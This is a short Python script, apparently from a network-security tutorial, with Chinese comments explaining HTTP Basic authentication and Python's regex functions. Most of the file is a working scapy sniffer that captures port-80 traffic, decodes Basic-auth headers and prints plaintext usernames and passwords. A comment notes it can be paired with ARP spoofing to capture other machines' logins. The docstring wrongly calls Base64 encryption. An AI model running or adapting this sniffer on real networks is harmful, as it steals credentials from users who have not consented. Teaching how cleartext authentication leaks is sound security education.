"""
    很多应用程序也可以使用HTTP与Web服务器进行交互，这时通常会采用一种叫做HTTP基本认证方式。这种方式
    使用Base64算法来加密   "用户名:密码"    并将加密后的消息放在HTTP Request 中的
    header Authorization 中发送给服务端。

    re:查找字符串通常用到 re.match与re.search
    其中 re.match只匹配字符串的开始，如果字符串开始就不符合正则表达式则匹配失败,返回None
    re.search 匹配整个字符串，直到找到一个匹配。
"""
# 只能捕获本机登录数据包，如果想捕获其他计算机的，需要和ARP欺骗结合使用
import re  # 正则表达式
from base64 import b64decode
from scapy.all import sniff

dev = "eth0"


def handle_packet(packet):
    tcp = packet.getlayer("TCP")
    match = re.search(r"Authorization: Basic (.+)", str(tcp.payload))
    print(str(tcp.payload))
    if match:  # base64:   b64encode用来编码, b64decode用来解码.
        auth_str = b64decode(match.group(1))
        auth = auth_str.split(":")
        print("User: " + auth[0] + " Pass: " + auth[1])


sniff(iface=dev, store=0, filter="tcp and port 80", prn=handle_packet)
